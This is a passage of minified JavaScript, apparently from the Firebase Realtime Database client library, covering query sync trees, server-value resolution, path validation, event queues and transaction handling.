 */let Wd;class kT{constructor(){this.views=new Map}}function O5(t){B(!Wd,"__referenceConstructor has already been defined"),Wd=t}function D5(){return B(Wd,"Reference.ts has not been loaded"),Wd}function j5(t){return t.views.size===0}function iy(t,e,n,r){const i=e.source.queryId;if(i!==null){const s=t.views.get(i);return B(s!=null,"SyncTree gave us an op for an invalid query."),jx(s,e,n,r)}else{let s=[];for(const o of t.views.values())s=s.concat(jx(o,e,n,r));return s}}function PT(t,e,n,r,i){const s=e._queryIdentifier,o=t.views.get(s);if(!o){let a=Bd(n,i?r:null),c=!1;a?c=!0:r instanceof te?(a=ty(n,r),c=!1):(a=te.EMPTY_NODE,c=!1);const u=Rh(new Ui(a,c,!1),new Ui(r,i,!1));return new I5(e,u)}return o}function M5(t,e,n,r,i,s){const o=PT(t,e,r,i,s);return t.views.has(e._queryIdentifier)||t.views.set(e._queryIdentifier,o),R5(o,n),A5(o,n)}function L5(t,e,n,r){const i=e._queryIdentifier,s=[];let o=[];const a=$i(t);if(i==="default")for(const[c,u]of t.views.entries())o=o.concat(Dx(u,n,r)),Ox(u)&&(t.views.delete(c),u.query._queryParams.loadsAllData()||s.push(u.query));else{const c=t.views.get(i);c&&(o=o.concat(Dx(c,n,r)),Ox(c)&&(t.views.delete(i),c.query._queryParams.loadsAllData()||s.push(c.query)))}return a&&!$i(t)&&s.push(new(D5())(e._repo,e._path)),{removed:s,events:o}}function RT(t){const e=[];for(const n of t.views.values())n.query._queryParams.loadsAllData()||e.push(n);return e}function Ni(t,e){let n=null;for(const r of t.views.values())n=n||P5(r,e);return n}function AT(t,e){if(e._queryParams.loadsAllData())return Oh(t);{const r=e._queryIdentifier;return t.views.get(r)}}function OT(t,e){return AT(t,e)!=null}function $i(t){return Oh(t)!=null}function Oh(t){for(const e of t.views.values())if(e.query._queryParams.loadsAllData())return e;return null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Kd;function F5(t){B(!Kd,"__referenceConstructor has already been defined"),Kd=t}function U5(){return B(Kd,"Reference.ts has not been loaded"),Kd}let $5=1;class Mx{constructor(e){this.listenProvider_=e,this.syncPointTree_=new Ne(null),this.pendingWriteTree_=m5(),this.tagToQueryMap=new Map,this.queryToTagMap=new Map}}function DT(t,e,n,r,i){return r5(t.pendingWriteTree_,e,n,r,i),i?oa(t,new Ns(Jv(),e,n)):[]}function z5(t,e,n,r){i5(t.pendingWriteTree_,e,n,r);const i=Ne.fromObject(n);return oa(t,new Vo(Jv(),e,i))}function mi(t,e,n=!1){const r=s5(t.pendingWriteTree_,e);if(o5(t.pendingWriteTree_,e)){let s=new Ne(null);return r.snap!=null?s=s.set(ve(),!0):ht(r.children,o=>{s=s.set(new Se(o),!0)}),oa(t,new $d(r.path,s,n))}else return[]}function Cc(t,e,n){return oa(t,new Ns(Zv(),e,n))}function B5(t,e,n){const r=Ne.fromObject(n);return oa(t,new Vo(Zv(),e,r))}function V5(t,e){return oa(t,new ql(Zv(),e))}function H5(t,e,n){const r=oy(t,n);if(r){const i=ay(r),s=i.path,o=i.queryId,a=Pt(s,e),c=new ql(ey(o),a);return ly(t,s,c)}else return[]}function Gd(t,e,n,r,i=!1){const s=e._path,o=t.syncPointTree_.get(s);let a=[];if(o&&(e._queryIdentifier==="default"||OT(o,e))){const c=L5(o,e,n,r);j5(o)&&(t.syncPointTree_=t.syncPointTree_.remove(s));const u=c.removed;if(a=c.events,!i){const p=u.findIndex(h=>h._queryParams.loadsAllData())!==-1,f=t.syncPointTree_.findOnPath(s,(h,E)=>$i(E));if(p&&!f){const h=t.syncPointTree_.subtree(s);if(!h.isEmpty()){const E=G5(h);for(let _=0;_<E.length;++_){const y=E[_],C=y.query,x=FT(t,y);t.listenProvider_.startListening(ml(C),Yl(t,C),x.hashFn,x.onComplete)}}}!f&&u.length>0&&!r&&(p?t.listenProvider_.stopListening(ml(e),null):u.forEach(h=>{const E=t.queryToTagMap.get(Dh(h));t.listenProvider_.stopListening(ml(h),E)}))}q5(t,u)}return a}function jT(t,e,n,r){const i=oy(t,r);if(i!=null){const s=ay(i),o=s.path,a=s.queryId,c=Pt(o,e),u=new Ns(ey(a),c,n);return ly(t,o,u)}else return[]}function W5(t,e,n,r){const i=oy(t,r);if(i){const s=ay(i),o=s.path,a=s.queryId,c=Pt(o,e),u=Ne.fromObject(n),p=new Vo(ey(a),c,u);return ly(t,o,p)}else return[]}function Jm(t,e,n,r=!1){const i=e._path;let s=null,o=!1;t.syncPointTree_.foreachOnPath(i,(h,E)=>{const _=Pt(h,i);s=s||Ni(E,_),o=o||$i(E)});let a=t.syncPointTree_.get(i);a?(o=o||$i(a),s=s||Ni(a,ve())):(a=new kT,t.syncPointTree_=t.syncPointTree_.set(i,a));let c;s!=null?c=!0:(c=!1,s=te.EMPTY_NODE,t.syncPointTree_.subtree(i).foreachChild((E,_)=>{const y=Ni(_,ve());y&&(s=s.updateImmediateChild(E,y))}));const u=OT(a,e);if(!u&&!e._queryParams.loadsAllData()){const h=Dh(e);B(!t.queryToTagMap.has(h),"View does not exist, but we have a tag");const E=Y5();t.queryToTagMap.set(h,E),t.tagToQueryMap.set(E,h)}const p=Ah(t.pendingWriteTree_,i);let f=M5(a,e,n,p,s,c);if(!u&&!o&&!r){const h=AT(a,e);f=f.concat(Q5(t,e,h))}return f}function sy(t,e,n){const i=t.pendingWriteTree_,s=t.syncPointTree_.findOnPath(e,(o,a)=>{const c=Pt(o,e),u=Ni(a,c);if(u)return u});return CT(i,e,s,n,!0)}function K5(t,e){const n=e._path;let r=null;t.syncPointTree_.foreachOnPath(n,(u,p)=>{const f=Pt(u,n);r=r||Ni(p,f)});let i=t.syncPointTree_.get(n);i?r=r||Ni(i,ve()):(i=new kT,t.syncPointTree_=t.syncPointTree_.set(n,i));const s=r!=null,o=s?new Ui(r,!0,!1):null,a=Ah(t.pendingWriteTree_,e._path),c=PT(i,e,a,s?o.getNode():te.EMPTY_NODE,s);return k5(c)}function oa(t,e){return MT(e,t.syncPointTree_,null,Ah(t.pendingWriteTree_,ve()))}function MT(t,e,n,r){if(ce(t.path))return LT(t,e,n,r);{const i=e.get(ve());n==null&&i!=null&&(n=Ni(i,ve()));let s=[];const o=ae(t.path),a=t.operationForChild(o),c=e.children.get(o);if(c&&a){const u=n?n.getImmediateChild(o):null,p=ST(r,o);s=s.concat(MT(a,c,u,p))}return i&&(s=s.concat(iy(i,t,r,n))),s}}function LT(t,e,n,r){const i=e.get(ve());n==null&&i!=null&&(n=Ni(i,ve()));let s=[];return e.children.inorderTraversal((o,a)=>{const c=n?n.getImmediateChild(o):null,u=ST(r,o),p=t.operationForChild(o);p&&(s=s.concat(LT(p,a,c,u)))}),i&&(s=s.concat(iy(i,t,r,n))),s}function FT(t,e){const n=e.query,r=Yl(t,n);return{hashFn:()=>(N5(e)||te.EMPTY_NODE).hash(),onComplete:i=>{if(i==="ok")return r?H5(t,n._path,r):V5(t,n._path);{const s=VF(i,n);return Gd(t,n,null,s)}}}}function Yl(t,e){const n=Dh(e);return t.queryToTagMap.get(n)}function Dh(t){return t._path.toString()+"$"+t._queryIdentifier}function oy(t,e){return t.tagToQueryMap.get(e)}function ay(t){const e=t.indexOf("$");return B(e!==-1&&e<t.length-1,"Bad queryKey."),{queryId:t.substr(e+1),path:new Se(t.substr(0,e))}}function ly(t,e,n){const r=t.syncPointTree_.get(e);B(r,"Missing sync point for query tag that we're tracking");const i=Ah(t.pendingWriteTree_,e);return iy(r,n,i,null)}function G5(t){return t.fold((e,n,r)=>{if(n&&$i(n))return[Oh(n)];{let i=[];return n&&(i=RT(n)),ht(r,(s,o)=>{i=i.concat(o)}),i}})}function ml(t){return t._queryParams.loadsAllData()&&!t._queryParams.isDefault()?new(U5())(t._repo,t._path):t}function q5(t,e){for(let n=0;n<e.length;++n){const r=e[n];if(!r._queryParams.loadsAllData()){const i=Dh(r),s=t.queryToTagMap.get(i);t.queryToTagMap.delete(i),t.tagToQueryMap.delete(s)}}}function Y5(){return $5++}function Q5(t,e,n){const r=e._path,i=Yl(t,e),s=FT(t,n),o=t.listenProvider_.startListening(ml(e),i,s.hashFn,s.onComplete),a=t.syncPointTree_.subtree(r);if(i)B(!$i(a.value),"If we're adding a query, it shouldn't be shadowed");else{const c=a.fold((u,p,f)=>{if(!ce(u)&&p&&$i(p))return[Oh(p).query];{let h=[];return p&&(h=h.concat(RT(p).map(E=>E.query))),ht(f,(E,_)=>{h=h.concat(_)}),h}});for(let u=0;u<c.length;++u){const p=c[u];t.listenProvider_.stopListening(ml(p),Yl(t,p))}}return o}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cy{constructor(e){this.node_=e}getImmediateChild(e){const n=this.node_.getImmediateChild(e);return new cy(n)}node(){return this.node_}}class uy{constructor(e,n){this.syncTree_=e,this.path_=n}getImmediateChild(e){const n=Ve(this.path_,e);return new uy(this.syncTree_,n)}node(){return sy(this.syncTree_,this.path_)}}const X5=function(t){return t=t||{},t.timestamp=t.timestamp||new Date().getTime(),t},Lx=function(t,e,n){if(!t||typeof t!="object")return t;if(B(".sv"in t,"Unexpected leaf node or priority contents"),typeof t[".sv"]=="string")return J5(t[".sv"],e,n);if(typeof t[".sv"]=="object")return Z5(t[".sv"],e);B(!1,"Unexpected server value: "+JSON.stringify(t,null,2))},J5=function(t,e,n){switch(t){case"timestamp":return n.timestamp;default:B(!1,"Unexpected server value: "+t)}},Z5=function(t,e,n){t.hasOwnProperty("increment")||B(!1,"Unexpected server value: "+JSON.stringify(t,null,2));const r=t.increment;typeof r!="number"&&B(!1,"Unexpected increment value: "+r);const i=e.node();if(B(i!==null&&typeof i<"u","Expected ChildrenNode.EMPTY_NODE for nulls"),!i.isLeafNode())return r;const o=i.getValue();return typeof o!="number"?r:o+r},UT=function(t,e,n,r){return dy(e,new uy(n,t),r)},$T=function(t,e,n){return dy(t,new cy(e),n)};function dy(t,e,n){const r=t.getPriority().val(),i=Lx(r,e.getImmediateChild(".priority"),n);let s;if(t.isLeafNode()){const o=t,a=Lx(o.getValue(),e,n);return a!==o.getValue()||i!==o.getPriority().val()?new rt(a,et(i)):t}else{const o=t;return s=o,i!==o.getPriority().val()&&(s=s.updatePriority(new rt(i))),o.forEachChild(He,(a,c)=>{const u=dy(c,e.getImmediateChild(a),n);u!==c&&(s=s.updateImmediateChild(a,u))}),s}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class hy{constructor(e="",n=null,r={children:{},childCount:0}){this.name=e,this.parent=n,this.node=r}}function fy(t,e){let n=e instanceof Se?e:new Se(e),r=t,i=ae(n);for(;i!==null;){const s=Uo(r.node.children,i)||{children:{},childCount:0};r=new hy(i,r,s),n=ke(n),i=ae(n)}return r}function aa(t){return t.node.value}function zT(t,e){t.node.value=e,Zm(t)}function BT(t){return t.node.childCount>0}function eU(t){return aa(t)===void 0&&!BT(t)}function jh(t,e){ht(t.node.children,(n,r)=>{e(new hy(n,t,r))})}function VT(t,e,n,r){n&&!r&&e(t),jh(t,i=>{VT(i,e,!0,r)}),n&&r&&e(t)}function tU(t,e,n){let r=t.parent;for(;r!==null;){if(e(r))return!0;r=r.parent}return!1}function Sc(t){return new Se(t.parent===null?t.name:Sc(t.parent)+"/"+t.name)}function Zm(t){t.parent!==null&&nU(t.parent,t.name,t)}function nU(t,e,n){const r=eU(n),i=or(t.node.children,e);r&&i?(delete t.node.children[e],t.node.childCount--,Zm(t)):!r&&!i&&(t.node.children[e]=n.node,t.node.childCount++,Zm(t))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const rU=/[\[\].#$\/\u0000-\u001F\u007F]/,iU=/[\[\].#$\u0000-\u001F\u007F]/,fp=10*1024*1024,py=function(t){return typeof t=="string"&&t.length!==0&&!rU.test(t)},HT=function(t){return typeof t=="string"&&t.length!==0&&!iU.test(t)},sU=function(t){return t&&(t=t.replace(/^\/*\.info(\/|$)/,"/")),HT(t)},oU=function(t){return t===null||typeof t=="string"||typeof t=="number"&&!zv(t)||t&&typeof t=="object"&&or(t,".sv")},WT=function(t,e,n,r){r&&e===void 0||Mh(Ch(t,"value"),e,n)},Mh=function(t,e,n){const r=n instanceof Se?new C3(n,t):n;if(e===void 0)throw new Error(t+"contains undefined "+ls(r));if(typeof e=="function")throw new Error(t+"contains a function "+ls(r)+" with contents = "+e.toString());if(zv(e))throw new Error(t+"contains "+e.toString()+" "+ls(r));if(typeof e=="string"&&e.length>fp/3&&Sh(e)>fp)throw new Error(t+"contains a string greater than "+fp+" utf8 bytes "+ls(r)+" ('"+e.substring(0,50)+"...')");if(e&&typeof e=="object"){let i=!1,s=!1;if(ht(e,(o,a)=>{if(o===".value")i=!0;else if(o!==".priority"&&o!==".sv"&&(s=!0,!py(o)))throw new Error(t+" contains an invalid key ("+o+") "+ls(r)+`.  Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`);S3(r,o),Mh(t,a,r),b3(r)}),i&&s)throw new Error(t+' contains ".value" child '+ls(r)+" in addition to actual children.")}},aU=function(t,e){let n,r;for(n=0;n<e.length;n++){r=e[n];const s=Hl(r);for(let o=0;o<s.length;o++)if(!(s[o]===".priority"&&o===s.length-1)){if(!py(s[o]))throw new Error(t+"contains an invalid key ("+s[o]+") in path "+r.toString()+`. Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`)}}e.sort(E3);let i=null;for(n=0;n<e.length;n++){if(r=e[n],i!==null&&fn(i,r))throw new Error(t+"contains a path "+i.toString()+" that is ancestor of another path "+r.toString());i=r}},lU=function(t,e,n,r){const i=Ch(t,"values");if(!(e&&typeof e=="object")||Array.isArray(e))throw new Error(i+" must be an object containing the children to replace.");const s=[];ht(e,(o,a)=>{const c=new Se(o);if(Mh(i,a,Ve(n,c)),Kv(c)===".priority"&&!oU(a))throw new Error(i+"contains an invalid value for '"+c.toString()+"', which must be a valid Firebase priority (a string, finite number, server value, or null).");s.push(c)}),aU(i,s)},KT=function(t,e,n,r){if(!HT(n))throw new Error(Ch(t,e)+'was an invalid path = "'+n+`". Paths must be non-empty strings and can't contain ".", "#", "$", "[", or "]"`)},cU=function(t,e,n,r){n&&(n=n.replace(/^\/*\.info(\/|$)/,"/")),KT(t,e,n)},my=function(t,e){if(ae(e)===".info")throw new Error(t+" failed = Can't modify data under /.info/")},uU=function(t,e){const n=e.path.toString();if(typeof e.repoInfo.host!="string"||e.repoInfo.host.length===0||!py(e.repoInfo.namespace)&&e.repoInfo.host.split(":")[0]!=="localhost"||n.length!==0&&!sU(n))throw new Error(Ch(t,"url")+`must be a valid firebase URL and the path can't contain ".", "#", "$", "[", or "]".`)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dU{constructor(){this.eventLists_=[],this.recursionDepth_=0}}function Lh(t,e){let n=null;for(let r=0;r<e.length;r++){const i=e[r],s=i.getPath();n!==null&&!Gv(s,n.path)&&(t.eventLists_.push(n),n=null),n===null&&(n={events:[],path:s}),n.events.push(i)}n&&t.eventLists_.push(n)}function GT(t,e,n){Lh(t,n),qT(t,r=>Gv(r,e))}function yn(t,e,n){Lh(t,n),qT(t,r=>fn(r,e)||fn(e,r))}function qT(t,e){t.recursionDepth_++;let n=!0;for(let r=0;r<t.eventLists_.length;r++){const i=t.eventLists_[r];if(i){const s=i.path;e(s)?(hU(t.eventLists_[r]),t.eventLists_[r]=null):n=!1}}n&&(t.eventLists_=[]),t.recursionDepth_--}function hU(t){for(let e=0;e<t.events.length;e++){const n=t.events[e];if(n!==null){t.events[e]=null;const r=n.getEventRunner();dl&&ct("event: "+n.toString()),sa(r)}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fU="repo_interrupt",pU=25;class mU{constructor(e,n,r,i){this.repoInfo_=e,this.forceRestClient_=n,this.authTokenProvider_=r,this.appCheckProvider_=i,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new dU,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=Ud(),this.transactionQueueTree_=new hy,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}toString(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host}}function gU(t,e,n){if(t.stats_=Hv(t.repoInfo_),t.forceRestClient_||GF())t.server_=new Fd(t.repoInfo_,(r,i,s,o)=>{Fx(t,r,i,s,o)},t.authTokenProvider_,t.appCheckProvider_),setTimeout(()=>Ux(t,!0),0);else{if(typeof n<"u"&&n!==null){if(typeof n!="object")throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{tt(n)}catch(r){throw new Error("Invalid authOverride provided: "+r)}}t.persistentConnection_=new br(t.repoInfo_,e,(r,i,s,o)=>{Fx(t,r,i,s,o)},r=>{Ux(t,r)},r=>{vU(t,r)},t.authTokenProvider_,t.appCheckProvider_,n),t.server_=t.persistentConnection_}t.authTokenProvider_.addTokenChangeListener(r=>{t.server_.refreshAuthToken(r)}),t.appCheckProvider_.addTokenChangeListener(r=>{t.server_.refreshAppCheckToken(r.token)}),t.statsReporter_=JF(t.repoInfo_,()=>new X3(t.stats_,t.server_)),t.infoData_=new K3,t.infoSyncTree_=new Mx({startListening:(r,i,s,o)=>{let a=[];const c=t.infoData_.getNode(r._path);return c.isEmpty()||(a=Cc(t.infoSyncTree_,r._path,c),setTimeout(()=>{o("ok")},0)),a},stopListening:()=>{}}),gy(t,"connected",!1),t.serverSyncTree_=new Mx({startListening:(r,i,s,o)=>(t.server_.listen(r,s,i,(a,c)=>{const u=o(a,c);yn(t.eventQueue_,r._path,u)}),[]),stopListening:(r,i)=>{t.server_.unlisten(r,i)}})}function YT(t){const n=t.infoData_.getNode(new Se(".info/serverTimeOffset")).val()||0;return new Date().getTime()+n}function Fh(t){return X5({timestamp:YT(t)})}function Fx(t,e,n,r,i){t.dataUpdateCount++;const s=new Se(e);n=t.interceptServerDataCallback_?t.interceptServerDataCallback_(e,n):n;let o=[];if(i)if(r){const c=Sd(n,u=>et(u));o=W5(t.serverSyncTree_,s,c,i)}else{const c=et(n);o=jT(t.serverSyncTree_,s,c,i)}else if(r){const c=Sd(n,u=>et(u));o=B5(t.serverSyncTree_,s,c)}else{const c=et(n);o=Cc(t.serverSyncTree_,s,c)}let a=s;o.length>0&&(a=Wo(t,s)),yn(t.eventQueue_,a,o)}function Ux(t,e){gy(t,"connected",e),e===!1&&xU(t)}function vU(t,e){ht(e,(n,r)=>{gy(t,n,r)})}function gy(t,e,n){const r=new Se("/.info/"+e),i=et(n);t.infoData_.updateSnapshot(r,i);const s=Cc(t.infoSyncTree_,r,i);yn(t.eventQueue_,r,s)}function vy(t){return t.nextWriteId_++}function yU(t,e,n){const r=K5(t.serverSyncTree_,e);return r!=null?Promise.resolve(r):t.server_.get(e).then(i=>{const s=et(i).withIndex(e._queryParams.getIndex());Jm(t.serverSyncTree_,e,n,!0);let o;if(e._queryParams.loadsAllData())o=Cc(t.serverSyncTree_,e._path,s);else{const a=Yl(t.serverSyncTree_,e);o=jT(t.serverSyncTree_,e._path,s,a)}return yn(t.eventQueue_,e._path,o),Gd(t.serverSyncTree_,e,n,null,!0),s},i=>(bc(t,"get for query "+tt(e)+" failed: "+i),Promise.reject(new Error(i))))}function _U(t,e,n,r,i){bc(t,"set",{path:e.toString(),value:n,priority:r});const s=Fh(t),o=et(n,r),a=sy(t.serverSyncTree_,e),c=$T(o,a,s),u=vy(t),p=DT(t.serverSyncTree_,e,c,u,!0);Lh(t.eventQueue_,p),t.server_.put(e.toString(),o.val(!0),(h,E)=>{const _=h==="ok";_||At("set at "+e+" failed: "+h);const y=mi(t.serverSyncTree_,u,!_);yn(t.eventQueue_,e,y),eg(t,i,h,E)});const f=_y(t,e);Wo(t,f),yn(t.eventQueue_,f,[])}function wU(t,e,n,r){bc(t,"update",{path:e.toString(),value:n});let i=!0;const s=Fh(t),o={};if(ht(n,(a,c)=>{i=!1,o[a]=UT(Ve(e,a),et(c),t.serverSyncTree_,s)}),i)ct("update() called with empty data.  Don't do anything."),eg(t,r,"ok",void 0);else{const a=vy(t),c=z5(t.serverSyncTree_,e,o,a);Lh(t.eventQueue_,c),t.server_.merge(e.toString(),n,(u,p)=>{const f=u==="ok";f||At("update at "+e+" failed: "+u);const h=mi(t.serverSyncTree_,a,!f),E=h.length>0?Wo(t,e):e;yn(t.eventQueue_,E,h),eg(t,r,u,p)}),ht(n,u=>{const p=_y(t,Ve(e,u));Wo(t,p)}),yn(t.eventQueue_,e,[])}}function xU(t){bc(t,"onDisconnectEvents");const e=Fh(t),n=Ud();Km(t.onDisconnect_,ve(),(i,s)=>{const o=UT(i,s,t.serverSyncTree_,e);_T(n,i,o)});let r=[];Km(n,ve(),(i,s)=>{r=r.concat(Cc(t.serverSyncTree_,i,s));const o=_y(t,i);Wo(t,o)}),t.onDisconnect_=Ud(),yn(t.eventQueue_,ve(),r)}function EU(t,e,n){let r;ae(e._path)===".info"?r=Jm(t.infoSyncTree_,e,n):r=Jm(t.serverSyncTree_,e,n),GT(t.eventQueue_,e._path,r)}function QT(t,e,n){let r;ae(e._path)===".info"?r=Gd(t.infoSyncTree_,e,n):r=Gd(t.serverSyncTree_,e,n),GT(t.eventQueue_,e._path,r)}function CU(t){t.persistentConnection_&&t.persistentConnection_.interrupt(fU)}function bc(t,...e){let n="";t.persistentConnection_&&(n=t.persistentConnection_.id+":"),ct(n,...e)}function eg(t,e,n,r){e&&sa(()=>{if(n==="ok")e(null);else{const i=(n||"error").toUpperCase();let s=i;r&&(s+=": "+r);const o=new Error(s);o.code=i,e(o)}})}function XT(t,e,n){return sy(t.serverSyncTree_,e,n)||te.EMPTY_NODE}function yy(t,e=t.transactionQueueTree_){if(e||Uh(t,e),aa(e)){const n=ZT(t,e);B(n.length>0,"Sending zero length transaction queue"),n.every(i=>i.status===0)&&SU(t,Sc(e),n)}else BT(e)&&jh(e,n=>{yy(t,n)})}function SU(t,e,n){const r=n.map(u=>u.currentWriteId),i=XT(t,e,r);let s=i;const o=i.hash();for(let u=0;u<n.length;u++){const p=n[u];B(p.status===0,"tryToSendTransactionQueue_: items in queue should all be run."),p.status=1,p.retryCount++;const f=Pt(e,p.path);s=s.updateChild(f,p.currentOutputSnapshotRaw)}const a=s.val(!0),c=e;t.server_.put(c.toString(),a,u=>{bc(t,"transaction put response",{path:c.toString(),status:u});let p=[];if(u==="ok"){const f=[];for(let h=0;h<n.length;h++)n[h].status=2,p=p.concat(mi(t.serverSyncTree_,n[h].currentWriteId)),n[h].onComplete&&f.push(()=>n[h].onComplete(null,!0,n[h].currentOutputSnapshotResolved)),n[h].unwatcher();Uh(t,fy(t.transactionQueueTree_,e)),yy(t,t.transactionQueueTree_),yn(t.eventQueue_,e,p);for(let h=0;h<f.length;h++)sa(f[h])}else{if(u==="datastale")for(let f=0;f<n.length;f++)n[f].status===3?n[f].status=4:n[f].status=0;else{At("transaction at "+c.toString()+" failed: "+u);for(let f=0;f<n.length;f++)n[f].status=4,n[f].abortReason=u}Wo(t,e)}},o)}function Wo(t,e){const n=JT(t,e),r=Sc(n),i=ZT(t,n);return bU(t,i,r),r}function bU(t,e,n){if(e.length===0)return;const r=[];let i=[];const o=e.filter(a=>a.status===0).map(a=>a.currentWriteId);for(let a=0;a<e.length;a++){const c=e[a],u=Pt(n,c.path);let p=!1,f;if(B(u!==null,"rerunTransactionsUnderNode_: relativePath should not be null."),c.status===4)p=!0,f=c.abortReason,i=i.concat(mi(t.serverSyncTree_,c.currentWriteId,!0));else if(c.status===0)if(c.retryCount>=pU)p=!0,f="maxretry",i=i.concat(mi(t.serverSyncTree_,c.currentWriteId,!0));else{const h=XT(t,c.path,o);c.currentInputSnapshot=h;const E=e[a].update(h.val());if(E!==void 0){Mh("transaction failed: Data returned ",E,c.path);let _=et(E);typeof E=="object"&&E!=null&&or(E,".priority")||(_=_.updatePriority(h.getPriority()));const C=c.currentWriteId,x=Fh(t),w=$T(_,h,x);c.currentOutputSnapshotRaw=_,c.currentOutputSnapshotResolved=w,c.currentWriteId=vy(t),o.splice(o.indexOf(C),1),i=i.concat(DT(t.serverSyncTree_,c.path,w,c.currentWriteId,c.applyLocally)),i=i.concat(mi(t.serverSyncTree_,C,!0))}else p=!0,f="nodata",i=i.concat(mi(t.serverSyncTree_,c.currentWriteId,!0))}yn(t.eventQueue_,n,i),i=[],p&&(e[a].status=2,function(h){setTimeout(h,Math.floor(0))}(e[a].unwatcher),e[a].onComplete&&(f==="nodata"?r.push(()=>e[a].onComplete(null,!1,e[a].currentInputSnapshot)):r.push(()=>e[a].onComplete(new Error(f),!1,null))))}Uh(t,t.transactionQueueTree_);for(let a=0;a<r.length;a++)sa(r[a]);yy(t,t.transactionQueueTree_)}function JT(t,e){let n,r=t.transactionQueueTree_;for(n=ae(e);n!==null&&aa(r)===void 0;)r=fy(r,n),e=ke(e),n=ae(e);return r}function ZT(t,e){const n=[];return eI(t,e,n),n.sort((r,i)=>r.order-i.order),n}function eI(t,e,n){const r=aa(e);if(r)for(let i=0;i<r.length;i++)n.push(r[i]);jh(e,i=>{eI(t,i,n)})}function Uh(t,e){const n=aa(e);if(n){let r=0;for(let i=0;i<n.length;i++)n[i].status!==2&&(n[r]=n[i],r++);n.length=r,zT(e,n.length>0?n:void 0)}jh(e,r=>{Uh(t,r)})}function _y(t,e){const n=Sc(JT(t,e)),r=fy(t.transactionQueueTree_,e);return tU(r,i=>{pp(t,i)}),pp(t,r),VT(r,i=>{pp(t,i)}),n}function pp(t,e){const n=aa(e);if(n){const r=[];let i=[],s=-1;for(let o=0;o<n.length;o++)n[o].status===3||(n[o].status===1?(B(s===o-1,"All SENT items should be at beginning of queue."),s=o,n[o].status=3,n[o].abortReason="set"):(B(n[o].status===0,"Unexpected transaction status in abort"),n[o].unwatcher(),i=i.concat(mi(t.serverSyncTree_,n[o].currentWriteId,!0)),n[o].onComplete&&r.push(n[o].onComplete.bind(null,new Error("set"),!1,null))));s===-1?zT(e,void 0):n.length=s+1,yn(t.eventQueue_,Sc(e),i);for(let o=0;o<r.length;o++)sa(r[o])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
